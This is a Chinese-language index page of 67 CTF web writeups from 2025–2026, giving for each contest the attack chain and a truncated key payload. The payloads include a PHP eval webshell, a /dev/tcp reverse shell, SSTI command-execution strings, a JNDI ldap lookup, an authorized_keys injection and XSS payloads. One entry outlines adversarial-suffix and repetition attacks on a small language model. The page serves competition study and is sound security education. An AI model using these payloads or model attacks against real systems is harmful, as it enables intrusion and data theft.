---
title: Des-CTF 语料索引 — Web（2025+）（67 篇比赛 WP）
tags: [source-index, corpus, des-ctf, wp, web]
category: web
triggers: ["SSTI", "AES-CBC", "XXTEA", "format string", "Apache Fury", "二次反序列化", "jwt", "php-unserialize", "prototype-pollution", "lateral_movement", "gzip_polyglot", "rce", "SQL注入", "Web-反序列化", "POP链", "sqli", "php-deserialize", "LitCTF nest_js 爆破 admin password", "星愿信箱 过滤 SSTI", "多重宇宙日记 settings update JSON 解析"]
created: 2026-11-01
updated: 2026-11-01
sources: [https://github.com/Dest1ny-Sec/Des-CTF-Knowledge]
---

# Des-CTF 语料索引 — Web（2025+）

## Summary

外部语料库 `Dest1ny-Sec/Des-CTF-Knowledge` 中 **67 篇 Web（2025+） 比赛 WP**（覆盖 64 场比赛）的结构化索引。
每条记录保留「比赛 → 题目/攻击链 → 关键 payload → 要义」，原始全文未镜像，需细节时按 `contest` 回源 GitHub 的 `CTF大赛WP集合/articles/<文件名>.full.md`。

## Key Points

- 高频考点（按 tags 词频）：SSTI、AES-CBC、XXTEA、format string、Apache Fury、二次反序列化、jwt、php-unserialize、prototype-pollution、lateral_movement、gzip_polyglot、rce、SQL注入、Web-反序列化、POP链
- 高频比赛：2025 领航杯网安赛项、SUCTF、WMCTF 2025、2025 LitCTF、2025 招商铸盾智能网联汽车攻防赛、2025 数字中国创新大赛数字安全赛道、2025 ISG 观安杯、2025 广西网络与信息安全职业技能竞赛
- tags 来自上游 frontmatter（允许跨赛道噪声，如 Web 页出现 ret2libc），仅作检索线索
- 用法：Grep 本页的比赛名或考点词 → 命中条目 → 需要细节时回源原文；不要在本页上做二次推理

## 按比赛分组

### 2025 FIC 互联网取证晋级赛（1 篇）
- 2025 FIC 晋级赛 Web3 取证 PHP 一话木马分析，URL 编码的中文路径蜂蜜锅底.css 作密钥种子 + md5 raw + AES-256-CBC 解密 + include… → `$a=file_get_contents('https://foren6.atwebpages.com/woyao/eat/火锅/蜂蜜锅底.css') / $b=md5($a,tr…`

### 2025 ISG 观安杯（1 篇）
- 2025 ISG 观安杯三题：ezbank 转账竞争条件 + babysec start.sh 密码 + blindpwn 整数溢出+write 泄露 canary 栈溢出。 → `整数溢出 -1 长度 → write 泄露 canary`；blindpwn 整数溢出 (scanf("%d", &len) 输 -1 = 0xFFFFFFFF) 是 pwn 高频套路；wr…

### 2025 LitCTF（1 篇）
- 2025 LitCTF Web 三题：NestJS admin 弱密码爆破 + SSTI 绕 {{ 过滤 + 多重宇宙日记 settings JSON 注入 isAdmin=true 提权。 → `settingsPayload.isAdmin = true → setTimeout(reload, 1000) → page reload 拿 flag`

### 2025 广西网络与信息安全职业技能竞赛（1 篇）
- 2025 广西决赛 AWD Web 复盘：纸质密码信封错过 + PHP likeadmin 默认 + UploadController 上传 + 未授权改密 + ThinkPHP 鉴权绕过。… → `POST /adminapi/upload/file Content-Type: multipart/form-data`；AWD 线下赛 = 断网 + 纸质密码信封多页 + 限时 20 分钟防御时间；赛前必备：本地代码审计脚本、漏洞扫描字典、上传 we…

### 2025 招商铸盾智能网联汽车攻防赛（1 篇）
- 2025 招商铸盾智能网联汽车：Web 单引号 SQLi 绕登录+zip 上传 webshell+SSH 爆破+环境变量 flag+Misc 日志审计+数独。 → `1.php 内容：<?=eval($_POST['cmd']);`；智能网联汽车攻防赛常考 IoT/车机 Web 固件上传+环境变量 flag；SSH 爆破用户名字典 test/ubuntu/roo…

### 2025 数字中国创新大赛数字安全赛道（1 篇）
- 2025 数字中国数据安全产业积分争夺赛：BitLocker 解密 + web 日志 awk 排序找黑客 IP + 邮箱对比 + VoIP 流量还原。 → `awk -F ' ' '{print $1}' 1.log / sort / uniq -c / sort -nr`；BitLocker 加密驱动器是数据安全赛常见考点；awk -F ' ' 取 IP + sort / uniq -c / sort…

### 2025 能源网络安全大赛（1 篇）
- 2025 能源网络安全：ThinkPHP 3.2.2 db[] 写配置 RCE + yunnuuu.php is_numeric 弱类型 + 费马小定理解 RSA + LWE Quatern… → `p = gcd(pow(2, hint, n) - 1, n)`；ThinkPHP 3.2.2 db[] 写配置 RCE 是历史漏洞；is_numeric 弱类型比较经典套（289114abc 不…

### 2025 蓝桥杯网络安全赛道（1 篇）
- 2025 蓝桥杯网络安全国赛：GitHack 源码泄露 + ssh attacker IP 溯源 + xxtea 解密 + fastcoll MD5 碰撞。 → `GitHack 工具下载源码 + action=eval&phpcode=system`；蓝桥杯网络安全赛道是国内官方赛事，难度中等；GitHack / GitTools 是 .git 源码泄露首选工具；fastcoll…

### 2025 西湖论剑（1 篇）
- 2025西湖论剑两道WEB,Flask SSTI双层关键词过滤绕(curl/sh/nc)+Nodejs SQL注入String.replace lastMatch($' or 1#)逃逸单引… → `$' or 1# (String.replace lastMatch特性)`；Flask render_template_string配合format()是危险的;Nodejs String.replace的…

### 2025 西湖论剑网络安全大赛（1 篇）
- 2025 西湖论剑 Rank-l Flask SSTI 绕黑名单大写化 lowercase + sqli or not Express 注入 + sqlmap tamper space2co… → `{%print cycler.next.__globals__.__builtins__.__import__(''os'').popen(''CD ..;NL FLAGF149'…`

### 2025 铸剑杯（1 篇）
- 2025 铸剑杯线下大模型安全（Hackergame 改编 TinyStories-33M）：复读特性拿 flag1 + 短前缀 Apology 拿 flag2 + Adversarial… → `Apology → accepted (儿童故事常见搭配)`；大模型安全 = 复读攻击（flag1 入门）+ 短前缀自然接续（flag2 中等）+ Adversarial Suffix 注入（…

### 2025 领航杯网安赛项（2 篇）
- 2025 领航杯学生组初赛：gin 框架 uint32 整数溢出买 flag（addprice=2^32-200000）+ math/rand 种子 1 默认 session 伪造 admi… → `addprice = pow(2, 32) - 200000; newmoney 溢出回 0`；math/rand 不 Seed 种子=1 是 Go 经典坑，rand.Read 输出可复现；uint32 加法溢出是 CTF W…
- 2025 领航杯学生组 fffbi：vite 目录穿越 + nginx 代理发现 secretserver + Object.freeze 沙箱逃逸 + Math.constructor=F… → `(Math=>(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,..…`

### 2025 ACTF（1 篇）
- ACTF 2025 — upload 任意文件读 + admin backdoor 密码爆破 + os.system 命令注入 + not so web 1 AES-CBC cookie 用…；Flask app.py 任意文件读 + sha256 哈希爆破 = admin 入口;os.system 拼接 file_pat…

### 2025 AliyunCTF（1 篇）
- AliyunCTF 2025 Jtools — Apache Fury 二次反序列化绕黑名单：PriorityQueue + PropertyComparator + hutool MapP…；hutool ObjectUtil.deserialize 默认黑白名单 null;动态代理 MapProxy#invoke 是触…

### 2025 Fetch Backend CTF (北美大厂面试题)（1 篇）
- 北美大厂后端 CTF 5 token: 列目录 + NaCl secretbox 解密 + openapi.yaml 接口 + connect+json gRPC。；列目录漏洞是 Web 入门常见; NaCl secretbox 需 pynacl nacl.secret.SecretBox; o…

### HKCERT CTF 2025 資格賽（1 篇）
- HKCERT 2025资格赛WEB方向5题,涵盖Next.js最新CVE RCE+原型链污染+JSON5 SSTI+lua沙箱逃逸+ThinkPHP模板注入+PHP反序列化+Apache a… → `POST /apps multipart __proto__ then prototype pollution chain`；2025最新Web攻击面包括Next.js Server Actions的__proto__污染+JS对象字面量构造;ap_exp…

### 2025 ISCTF（1 篇）
- ISCTF 2025 8 道 Web (文件上传/eval bypass/SQL 注入/PHP 反序列化/Flask pydash/SSTI) 多题型速查。

### 2025 NewStarCTF（1 篇）
- NewStar CTF 2025 Week1&Week2 Web 入门题，token 计算 + Session 维持 + 正则表达式。 → `expression = "token = (1234 * 5678) ^ 0xDEADBEEF" token = (1234*5678) ^ 0xDEADBEEF`；requests.Session() 自动维持 cookie；正则 re.search 提取表达式数字和异或值；token = (…

### RCTF 2025（1 篇）
- RCTF 2025 XMCVE-Polaris 战队第 16 名 3 大方向：PWN (浮点漏洞 + syscall) + Sandbox (LD_PRELOAD 替换 sandbox.so… → `bookkeeping() + runcode(shellcode) + sandbox.so LD_PRELOAD bypass + Spring JNDI ldap://att…`

### 2025 SANS Offensive CTF（1 篇）
- SANS Offensive CTF Taskist 4 题：IDOR 遍历 tasks/64 拿 flag1 + 改 user_id 改 admin 密码 + SSRF 测 LFI 读源码… → `file:///root/flag.txt`；IDOR + 权限提升 + SSRF + LFI 是 OWASP Top 10 经典 4 链；Burp Intruder 数字遍历…

### 2025 SUCTF（2 篇）
- SUCTF 2025 XMCVE-Polaris 第 4，PHP 反序列化新链 + Solidity 签名复用 + 内置服务器源码泄露。 → `/ser?ser=<base64(serialize($a))>`；CakePHP 链子 fix 时只改头/尾，中间常被保留；找链应优先按中间环节搜索。
- SUCTF 2025 Min-Venom：cakephp 5.1.4 新链 (RejectedPromise→ConstTypeNode→Table→MockClass) + pydash… → `signature2 = (27, r, n - s)`；椭圆曲线签名天然有两个 s 值，签名 hash 比较是常见绕过点。

### UTCTF 2025（1 篇）
- 狼组出品的 UTCTF 2025 全 11 题解，覆盖 Web/Game/Pwn/Misc/Reverse/Crypto 全部题型，详细到脚本可直接复用。 → `utflag{On3_sT3P_4t_4_t1m3} / utflag{1059-s-high-st-columbus-43206} / pl = b'A'*(0x80+8) +…`

### 2025 WIZ（1 篇）
- WIZ-2025 竞标赛第一期 Perimeter Leak，Spring Boot Actuator + IMDS 攻击 + AWS S3 数据外泄。 → `/actuator/heapdump IMDSv1 169.254.169.254 AWS S3`；Spring Boot Actuator 暴露 heapdump 含密钥；IMDSv1 无认证可访问，IMDSv2 需 token…

### 2025 WIZ 7月云安全挑战（1 篇）
- WIZ 7月云安全挑战 Contain Me If You Can，Docker 容器内 Scapy 伪造 PostgreSQL TCP 包做预认证 RCE + sudo 提权 + core… → `COPY tmp_output FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/172.19.0.3/8989 0>&1"'; / echo…`

### 2025 WIZ Cloud Hunting Games (云安全应急响应)（1 篇）
- WIZ Cloud Hunting Games 5 关 AWS 云安全应急响应，从 CloudTrail S3 入侵回溯到 Lambda 工作负载到 /var/log mount 隐藏到 c… → `aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --prefix 'files/'…`

### WMCTF 2025（2 篇）
- WMCTF 2025 星盟安全团队 XMCVE-Polaris 第 6 名杂烩 WP，BPF 内核利用 + LFSR 子集和 + pdfminer pickle RCE + Flask MT… → `0x150+0x159*2=0x402 bpf 越界 / split_master(B_decimal, segment_bits) / MT19937Predictor.setr…`
- WMCTF 2025 全题型 WP 集锦，pdfminer pickle RCE + Flask eval Popen + MT19937 状态恢复 + SVG 钓鱼页 unicode 替换… → `pickle.dumps(Exploit())+gzip.compress(pdf_header) / eval('__import__("os").system("cat /fl…`

### XSS Game系列 + prompt(1) to win + 看雪SDC 2025（1 篇）
- 看雪JGwebre总结XSS Game 9关DOM Clobbering与XSS绕过:innerHTML/eval/autofocus/javascript伪协议/JSFuck/Functi… → `?jeff=";alert(1)// + ?wey="autofocus onfocus=alert(1337)" + ?ricardo=javascript:alert(1337…`

### 2025 bi0sCTF（1 篇）
- bi0sCTF 2025 r3kapig 战队 WP 4 道区块链：瞬态存储偷窃/vault 溢出/时间旅行 DEX。 → `瞬态存储漏洞 + ERADICATE2 + vault 溢出 + DEX 价格操纵`；现代区块链 CTF 越来越像真实 DeFi 攻击复现（SIR.trading/Venus 等真实事件）。

### 2025 picoCTF（1 篇）
- picoCTF 2025 Web Exploitation 3 题：php RCE + python eval 绕 + SHA-1 collision。 → `SHA-1 chosen-prefix collision + impossible login`；''SHA-1 chosen-prefix collision 是 google 2017 攻击，CTF 经典题型。''

### 2025 京麒 CTF（1 篇）
- 京麒 CTF 三题 — SSTI 绕 disable 直接 RCE + FastJson 1.2.80 CVE-2022-25845 写 /etc/crontab 反弹 + 安卓 XXTEA…；FastJson 1.2.80 黑名单禁了 FileOutputStream 但应用自定义 FilterFileOutputStr…

### 2025 全国网络安全行业职业技能大赛（1 篇）
- 渗透组两道题,核心考点是SPL+PHP反序列化POP链构造SplFileObject+php://filter读flag.php源码,以及ereg NULL截断(9e9%00*-*)+md5… → `O%3A1%3A%22A%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A8%3A%…`

### 2025 威胁情报（1 篇）
- Mr_Rot13 APT分析：cPanel漏洞利用全链路（改密码/SSH公钥/PHP Webshell/JS注入/Filemanager远控/Telegram C2） → `F=/root/.u$$ ELF下载执行;root:123Qwe123C;ssh-ed25519 cpanel-updater;cpanel.py PHP Webshell;log…`

### 2025 强网杯（1 篇）
- 强网杯 7 大题型混合集 — Web Connection 注入 + Crypto GCD/AES + MT19937 LLL + Pwn printf+House of XXX + Rev…；汉明码 d=5 校验矩阵 P 选满秩行可解码 2 个错；MT19937 单 bit 状态基底可建 GF(2) 上 LLL 还原；s…

### 强网杯2025（1 篇）
- 强网杯2025 Qcalc:Android Content URI授权链(YAML history.yml)绕过读flag,核心在1800ms divide-by-zero触发BridgeA… → `content://history.yml ContentResolver授权 + YAML反序列化 + 1800ms divide-by-zero异常触发`

### 2025 强网杯S9线下赛（1 篇）
- 强网杯S9 Real World monotint:0x300R浏览器nday CVE-2024-12695 V8 FinalizationRegistry越界写到沙箱逃逸弹计算器。 → `Object.assign绕过properties hash check + SimpleNumberDictionary越界写 + 错位字节resize + V8 sandbox…`

### 2025 强网杯S9线下赛(Real World)（1 篇）
- 强网杯S9线下赛 RealWorld TrustSQL:SQLite3扩展函数+EDITOR环境变量+system命令注入+弹计算器。 → `EDITOR环境变量+system命令注入+gnome-calculator弹计算器`；SQLite3自定义函数漏洞:edit(1)+edit(2)注册为vuln → 写文件到temp%llx → sprintf(en…

### 2025 星芒杯（1 篇）
- 星芒杯 2025 Web WP，代码审计 call_user_func RCE + ISO-8859-1/UTF-8 编码还原 + 盲文解码 + LFI 文件读取。 → `flag{call_user_func} darkguard98 / secretgate45 ISO-8859-1 latin1`；call_user_func($func, $param) 是 PHP 经典 RCE；ISO-8859-1 → UTF-8 双重编…

### 春秋云境 GreatWall2025 靶场（1 篇）
- 春秋云境 GreatWall2025 长城杯靶场 WP，外网 Spring Cloud Gateway RCE → cdk_linux mount-procfs 容器逃逸 → 内网 Jdbc… → `./cdk_linux run mount-procfs /host/proc/ 'echo xxxxxx >> /root/.ssh/authorized_keys' / {"@…`

### 极客少年挑战赛2025决赛（1 篇）
- 极客少年挑战赛2025决赛Web：SSRF+SQL注入+PHP反序列化触发eval+进制转换字符串绕字母 → `filter: select/update/from/insert/delete/union/order/and/or/''/"/\;preg_match(''/a-z/im'',…`；REMOTE_ADDR==127.0.0.1本地SSRF+hex编码反序列化串+八进制字符串绕字母黑名单

### 2025 浙江省大学生网络与信息安全竞赛（1 篇）
- 第八届浙江省赛多题:Web反序列化POP链(User→Admin→FileReader)+RSA公因数e1/e2+密文二进制末尾判断+PWN格式化字符串负idx+long减key/逆XOR(… → `User->Admin->FileReader POP链/gmpy2.gcdext(e1,e2) → s, t = .../for i in c: if i[-1]==112: p…`

### 2025 湖南省第二届职工数字化应用技术技能大赛（1 篇）
- 湖南省第二届职工数安赛D2：base16+RSA+LCG+数据脱敏+dirsearch+JS前端加密绕过 → `base16解码;RSA+LCG;dirsearch robots.txt;JS加密timestamp+user_id+data`；数据安全管理员赛题偏简单基础+AI辅助解题（DeepSeek比qwen本地0.6b强）

### 2025 破阵阁（1 篇）
- 破阵阁・网安淬锋公开赛 10 道题全解 WP，涵盖 SQL 注入/路径穿越/JWT alg=none/命令注入/Webshell 还原/渗透。 → `flag uuids intruder id=47 sqlmap search superadmin/1Qaz2Wsx`；JWT alg=none 是经典签名绕过；Joomla 3.7.0 CVE-2017-8917 SQL 注入；nacos 注入看…

### 2025 破阵阁网安淬锋巅峰赛（1 篇）
- 破阵阁应急响应：Tomcat后门排查全流程（进程/ELF/profile/crontab/内存马/后门用户） → `netstat -anptu;/var/crash/tomcat ELF后门;/etc/profile;crontab -r;work/Catalina/localhost/a/…`；Tomcat应急响应必查项：crash目录ELF、profile、crontab、work/Catalina类加载器字节码、man…

### 2025 腾讯云黑客松 第二届智能渗透挑战赛（1 篇）
- 腾讯云黑客松第二届智能渗透挑战赛复盘：Orchestrator + Executor/Browser/C2/Reverse 4 个 MCP Agent + GLM5 自动解题，4 个赛区 5… → `{"chrome-devtools": {"command":"...", "visibility":"subagent:browser"}} / 你是 CTF XXX 专家，正在…`

### 2025 西湖论剑（1 篇）
- 金石滩小鲨鱼第10名WP,12题(签到/Rank-l/sqli-or-not/Rank-U/Vpwn/Heaven's door/matrixRSA/糟糕的磁盘/blink/sharkp/e… → `{{x.__init__.__globals__[''__builtins__''][''eval'']("__import__(''os'').popen(''head /fla…`

### 2025 软件系统安全赛（1 篇）
- 软件系统安全赛Thymeleaf 3.0.15视图名注入SSTI + 48-bit LFSR PRNG逆向破解admin密码 + 7z SUID提权读取root-only /flag,完整P… → `LFSR逆向6步 + __/$${'{SpEL}'}/__ + 7z a -ttar`；48-bit LFSR PRNG可逆向(2^6=64候选);Thymeleaf视图名拼接+__/$${'{SpEL}'}/__是稳…

### 2025 闽盾杯（1 篇）
- 闽盾杯2025:QR_Maze.xlsx(Excel+PIL 6倍画二维码)+upload.php(1.pHp大小写+content-type image/png+<?=file()读fla… → `zipfile.ZipFile + ET.fromstring + a1rc r''(\w+)(\d+)'' + float(v.text)>0.5 ? 1 : 0 + PIL L…`

### 2025 防衛省サイバーコンテスト（1 篇）
- 防衛省サイバーコンテスト2025 Writeup供養多方向:HTML注释flag+石中剑+download.php读源+JSON base64数组+ECC椭圆曲线(a=56,b=58,p=1… → `data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn1d/data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn0…`

### 香港網絡攻防精英培訓暨攻防大賽 2025（1 篇）
- 香港網絡攻防精英培訓賽2025初赛+决赛WP,涵盖SQL注入+PHP DirectoryIterator爆破文件名+XXE外带+Redis SSRF等基础Web题,初赛12题+决赛3题。 → `glob:///var/www/html/* + d80054c739859dfe.php`；PHP DirectoryIterator+glob://协议是稳定的LFI/目录扫描向量,XXE无回显必须用OOB外带+恶意DT…

### 2025 鹏云杯（1 篇）
- 鹏云杯 2025 — SecDisk truecrypt2john 字典爆破 + MD5 单字符查表 (chars 字典) + pcb5-printf fmtstr_payload 改 se…；fmtstr_payload 偏移从 8 起 (amd64 前 6 个 reg+retaddr)；改 setvbuf 入口是 fm…

### 2025 鹏城杯（1 篇）
- 鹏城杯 2025 7 题 — myZoo 菜单 pwn + MQTT Heartbeat TOCTOU + Pivoting 栈迁移 + ez_java JWT HS512+tar 写 sh…；JWT 密钥在 .class 文件中是字符串常量 (strings 命令可读)；tar 路径穿越 + JSP 映射 web.xml…

### 2026 NCTF（1 篇）
- 2026 NCTF Web: Blind SSTI 时延盲注 + N-RustPICA js 源码泄露 + Wiener 攻击 + GAME 五子棋协议走棋拿 flag。 → `Wiener 攻击：e/N^6 连分数展开 → 收敛分母 d`；Blind SSTI 时延盲注模板: 'sleep N' 判 RCE → find_flag_path → wc -c 算长度 →…

### 2026 丹麦国情局 FE（1 篇）
- 2026 丹麦国情局 FE 恶猿行动：MonkEZ/EDO 服务器渗透 - sqlmap + robots 路径穿越 + AES SSH 私钥 + docker 逃逸 + TLS 客户端证书… → `robots.txt → 路径穿越 → AES SSH 私钥`；丹麦国情局 FE 是面向计算机网络利用部 (CNE) 培训的高仿真 APT 渗透靶场，核心是 docker 逃逸 + TLS 客户…

### 2026 AliCTF（1 篇）
- AliCTF 2026 Fileury — Apache Fury 黑名单 bypass: SimpleCache$StoreableCachingMap + LazyMap + TiedM…；Apache Fury 黑名单 checkNotInDisallowedList 只在序列化时走;LazyMap(Storeabl…

### 2026 CCB（1 篇）
- CCB 决赛有感 — 实网渗透 schema.sql + 后台 PHP 改后缀 + find SUID 提权 + DokiLogic Renpy 1.exe XOR 35 还原 flag。；实网渗透 4 步曲:目录扫 → 凭据/源码 → 上传 RCE → SUID 提权;Renpy .rpyc 必用 unrpyc 解;…

### EHAX CTF 2026（1 篇）
- EHAX 2026 6题：Slice UAF+CrackMe AES+迷宫+智能合约+pyc → `func_ptr overwrite → execve("/bin/sh")`；Slice-Buffer共享data_ptr是GC漏判导致double-free经典模式

### 2026 LilacCTF（1 篇）
- LilacCTF 2026 Web (PHP dev server 源码泄露) + Python sandbox (禁数字字母 + 关键字黑名单 + 60 长度) bypass。 → `/`；/

### SUCTF 2026（1 篇）
- IoT 路由器 CGI 消息队列 + UAF 改函数指针 + RWX heap 跑 shellcode → `shellcode.ljust(0x7eb, b'\x90') + b'\x00' → Edit_VPN_Custom b'\x21\x5c'`；IoT 路由器架构是 web+daemon 消息队列；RWX heap 是低级 bug；apply_cb 是攻击热点

### 2026 THJCC CTF（1 篇）
- THJCC CTF 2026 多类 (Misc/Crypto/Web/Reverse/Forensics)：勒索软件 AES 解密 + WhoIS SSRF + 竞争写 WebShell +… → `THJCC{L1nK_R4Ns0mWar3_😭😭😭😭}`；PowerShell 勒索软件使用 MD5(时间戳) 作 key 时，时间窗口可爆破；AES-CBC + 头部保存时间 + IV…

### 2026 天穹智能分析 (奇安信)（1 篇）
- AF_ALG + splice 越界写污染 suid 二进制页缓存 → 提权 → `setuid(0); setgid(0); execve('/bin/sh', NULL, NULL)`；内核对 suid 二进制的「检查文件属性 vs 加载页缓存」是分离的，页缓存污染可绕过；AF_ALG scatterlist 越界…

### 2026 春秋云境 Powergrid 靶场（1 篇）
- 春秋云境 Powergrid 5 flag 全流程：swagger 弱口令 → 邮件钓鱼 + 免杀 → OpenVPN 改远端 IP → PTH 哈希传递 + WMIExec → Sprin… → `swagger-resources + /v2/api-docs / net user Administrator Admin123 / nxc smb 172.16.200.78…`

### 2026 春节领红包（1 篇）
- WASM 验证码生成：劫持 instantiate 暴露 memory + 劫持 getRandomValues 消除随机 + 内存扫描提 HMAC Key + Base64 字典。；WASM 加密逻辑不是黑盒，memory 暴露后 key + 算法全可被逆向；crypto API 钩子是 WASM 加密验证类…

### 2026 阿里CTF（1 篇）
- 阿里CTF 2026 — Web heartbeat 代理 + format string + SSTI + Android .webp 伪装 .class DexClassLoader +…；伪装 .webp/.png/.jpg 是反检测常规手段（CAFEBABE 头 magic number 直接暴露 .class）；…

### TQLCTF（1 篇）
- MYSQLI_INIT_COMMAND 注入 + secure_file_priv 盲注 + INTO DUMPFILE 写 phar + Doctrine 反序列化链 RCE → `mysqli_options($con, MYSQLI_INIT_COMMAND, 'select 0x<phar_hex> into dumpfile "/tmp/xxx/ran…`

## Connections

- 上层索引：[[ctf/source-corpus--des-ctf-knowledge]]
- Source: [https://github.com/Dest1ny-Sec/Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)

## Open Questions

- 本页为索引层，题目细节请回源；若某场比赛多题值得展开，再单独建 `ctf/<比赛>.md` 实体页。
